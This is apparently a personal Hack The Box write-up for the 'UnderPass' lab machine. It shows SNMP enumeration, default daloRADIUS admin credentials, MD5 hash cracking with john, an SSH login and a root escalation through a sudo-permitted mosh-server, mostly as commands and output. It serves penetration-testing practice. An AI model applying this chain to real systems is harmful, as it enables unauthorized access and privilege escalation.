# Underpass
- UnDerPass
- https://www.youtube.com/watch?v=6hoOcB9ubs8&t=256s
## Setup
```
┌──(root㉿kali)-[/home/jacob/Documents/Notes]
└─# cd HTB_Labs

┌──(root㉿kali)-[/home/jacob/Documents/Notes/HTB_Labs]
└─# touch Underpass.md; mousepad Underpass.md  
```
```
┌──(root㉿kali)-[/home/jacob/Desktop]
└─# mkdir underpass; cp nmap.sh underpass; cd underpass; la -la

┌──(root㉿kali)-[/home/jacob/Desktop/underpass]
└─# ./nmap.sh 
Usage: ./nmap.sh <filename> <target_ip>

┌──(root㉿kali)-[/home/jacob/Desktop/underpass]
└─# ./nmap.sh underpass 10.129.231.213                                                                                                         
Running nmap scan on 10.129.231.213 with output to underpass...
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-06 07:21 AEST
Nmap scan report for 10.129.231.213
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.06 seconds
Scan completed successfully.
Output files created: underpass.nmap, underpass.gnmap, underpass.xml

```
## IPPSEC




## Guided Mode Questions
1. How many open TCP ports are listening on UnderPass?
2

2. What UDP port in the nmap top 100 ports is open on UnderPass?
- UDP is connectionless and therefore takes longer because there's no handshake like TCP. Nmap sends a packet and has to wait to see what happens.
```
┌──(root㉿kali)-[/home/jacob/Desktop/underpass]
└─# nmap 10.129.231.213 -sU --top-ports=100
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-06 07:26 AEST
Nmap scan report for 10.129.231.213
Host is up (0.23s latency).
Not shown: 96 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
161/udp  open          snmp
1812/udp open|filtered radius
1813/udp open|filtered radacct

Nmap done: 1 IP address (1 host up) scanned in 142.49 seconds
```
161 - Simple Network Management Protocol (snmp) - protocol for monitoring and managing network devices.

3. What email address does the UnderPass server list as it's contact email?
Key OIDs to check:
- 1.3.6.1.2.1.1.4.0 = sysContact (most likely to have the email)
- 1.3.6.1.2.1.1.1.0 = sysDescr (system description)
- 1.3.6.1.2.1.1.5.0 = sysName (system name)
- 1.3.6.1.2.1.1.6.0 = sysLocation (system location)
```
┌──(root㉿kali)-[/home/jacob/Desktop/underpass]
└─# snmpget -v2c -c public 10.129.231.213 1.3.6.1.2.1.1.4.0                                                               
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
```
## snmpwalk does everything
```
┌──(root㉿kali)-[/home/jacob/Desktop/underpass]
└─# snmpwalk -v 2c -c public 10.129.231.213                                                                                                                
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (260984) 0:43:29.84
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (262877) 0:43:48.77
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 07 05 15 3A 0B 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 214
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

4. What is the name of the application hosted on the UnderPass webserver?
SNMP typically won't give you the name of a web application directly. SNMP is better for system-level info (CPU, memory, network) rather than application details.
```
┌──(root㉿kali)-[/home/jacob/Desktop/underpass]
└─# snmpget -v2c -c public 10.129.231.213 1.3.6.1.2.1.1.5.0
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
```
daloradius: a networking protocol that provides centralized authentication, authorization, and accounting (AAA) management for users who connect and use a network service.

5.  What is the relative path on the webserver for the operator login page for daloRADIUS?
- Going to `http://10.129.231.213/daloradius/` gives you a 403
- Searched for login.php on their github and found the operators login page and copied the path here: `/daloradius/app/operators/login.php` (Make sure to use the whole path when copying from github
- Navigating to `http://10.129.231.213/daloradius/app/operators/login.php` doesn't 403 and you have a login page.
- Same for `/daloradius/app/users/login.php` - We now have 2 login pages
- Otherwise you can brute force the directories with feroxbuster which found directories but doesnt look for specific files:
```
┌──(root㉿kali)-[/home/jacob/Desktop/underpass]
└─# feroxbuster -u http://underpass.htb/daloradius
                                                                                                                                                           
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://underpass.htb/daloradius
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
```

6. What is the password for the administrator user on the daloRADIUS application?
Search for 'daloradius default credentials' in google shows you `radius` is the default. These creds don't work on the user login but do on the admin

7. What is the clear text password of the svcMosh user on UnderPass?
- After logging into the operators portal, you find a user `svcMosh` and what looks like a hash of a password
```
┌──(root㉿kali)-[/home/jacob/Desktop/underpass]
└─# echo "412DD4759978ACFCC81DEAB01B382403" > hash.txt

┌──(root㉿kali)-[/home/jacob/Desktop/underpass]
└─# john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt                                                                             
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
underwaterfriends (?)     
1g 0:00:00:00 DONE (2025-07-06 08:16) 7.142g/s 21314Kp/s 21314Kc/s 21314KC/s undiamecaiQ..underpants2
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```
8. Submit the flag located in the svcMosh user's home directory.
- Tried using the svcMosh:underwaterfriends creds in the `/users/login.php` with no luck
- Revisting the NMAP scan makes me realise SSH is there
```
┌──(root㉿kali)-[/home/jacob/Desktop/underpass]
└─# ssh svcMosh@10.129.231.213
The authenticity of host '10.129.231.213 (10.129.231.213)' can't be established.
ED25519 key fingerprint is SHA256:zrDqCvZoLSy6MxBOPcuEyN926YtFC94ZCJ5TWRS0VaM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.129.231.213' (ED25519) to the list of known hosts.
svcMosh@10.129.231.213's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Jul  5 10:20:01 PM UTC 2025

  System load:  0.0               Processes:             226
  Usage of /:   49.6% of 6.56GB   Users logged in:       0
  Memory usage: 11%               IPv4 address for eth0: 10.129.231.213
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jan 11 13:27:33 2025 from 10.10.14.62
svcMosh@underpass:~$ 
```

9. What is the full path of the command that the svcMosh user can run as any user?
Use `sudo -l`:
```
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```
https://mosh.org/

10. Submit the flag located in the root user's home directory.
After running `sudo -l` to see what privs we have, we run sudo mosh-server which starts a server:
```
svcMosh@underpass:~$ sudo mosh-server


MOSH CONNECT 60001 kdzABQNGRhoTBKiOFenrpg

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 2278]
```
It complains about no MOSH_KEY:
```
svcMosh@underpass:~$ mosh-client 127.0.0.1 60001
MOSH_KEY environment variable not found.
```
The mosh-server command gives you that mosh key so include it in the command:
`svcMosh@underpass:~$ MOSH_KEY=eByZKeFlRSz0lb27UjvRDg mosh-client 127.0.0.1 60001`
The servers seem very short lived, so be quick and you'll log in as `root` and get the flag

## Lessons
- Rather than bruteforce directories for login pages etc open-source will just have that on their GitHub 
- `ssh svcmosh@10.129.231.213` would NOT have worked, only `ssh svcMosh@10.129.231.213`
- Don't forget `find . -type f -ls`
- Look in `/home` for other users
- Poke more at programs/applications to learn their commands, and also directories. Especially if they're open source.

